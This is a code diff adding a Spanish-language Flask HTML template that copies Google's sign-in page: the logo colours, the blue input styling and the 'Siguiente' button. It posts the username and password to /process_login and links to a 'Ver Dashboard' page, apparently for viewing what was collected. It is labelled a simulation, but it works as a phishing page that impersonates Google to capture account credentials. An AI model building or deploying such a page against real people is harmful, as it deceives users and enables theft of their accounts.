@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión (Simulación)</title>
+    <!-- Carga de Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Fuente limpia y fondo suave */
+        body { font-family: 'Inter', sans-serif; background-color: #f7f9fb; }
+        
+        /* Estilo para los campos de entrada para simular la caja de texto de Google */
+        .google-input {
+            padding: 1rem;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            transition: border 0.3s, box-shadow 0.3s;
+        }
+        /* Efecto al hacer foco (borde azul) */
+        .google-input:focus {
+            outline: none;
+            border-color: #1a73e8; /* Azul de Google */
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        /* Estilo para el botón principal (azul) */
+        .google-button {
+            background-color: #1a73e8; /* Azul de Google */
+            transition: background-color 0.3s;
+        }
+        .google-button:hover {
+            background-color: #176bd9;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <!-- Contenedor principal, más estrecho y con sombra suave -->
+    <div class="w-full max-w-sm bg-white p-10 rounded-xl shadow-lg border border-gray-200 text-center">
+        
+        <!-- Logo simulado (usando los colores característicos de Google) -->
+        <h1 class="text-3xl font-bold mb-8">
+            <span class="text-blue-600">G</span><span class="text-red-600">o</span><span class="text-yellow-600">o</span><span class="text-blue-600">g</span><span class="text-green-600">l</span><span class="text-red-600">e</span>
+        </h1>
+        
+        <h2 class="text-2xl text-gray-800 mb-2 font-medium">Iniciar Sesión</h2>
+        <p class="text-sm text-gray-500 mb-8">Continúa para subir tu archivo.</p>
+        
+        <form action="/process_login" method="post" class="space-y-6">
+            <!-- Campo oculto para el ID de sesión generado por el servidor Flask -->
+            <input type="hidden" name="session_id" value="{{ session_id }}">
+            
+            <div>
+                <!-- Campo de Usuario -->
+                <input type="text" id="username" name="username" required
+                       class="google-input w-full text-lg"
+                       placeholder="Usuario o correo electrónico"
+                       autocomplete="off">
+            </div>
+            
+            <div>
+                <!-- Campo de Contraseña -->
+                <input type="password" id="password" name="password" required
+                       class="google-input w-full text-lg"
+                       placeholder="Contraseña"
+                       autocomplete="new-password">
+            </div>
+            
+            <!-- Controles inferiores: Enlace a Dashboard y Botón "Siguiente" -->
+            <div class="flex justify-between items-center pt-4">
+                <a href="/view_data" class="text-sm font-medium text-blue-600 hover:text-blue-800 transition duration-150">
+                    Ver Dashboard
+                </a>
+                
+                <button type="submit"
+                        class="google-button text-white px-6 py-2 rounded-lg font-semibold shadow-md focus:outline-none transition duration-150">
+                    Siguiente
+                </button>
+            </div>
+        </form>
+
+        <p class="mt-8 text-xs text-center text-gray-400">ID de Sesión: <code>{{ session_id }}</code></p>
+    </div>
+</body>
+</html>
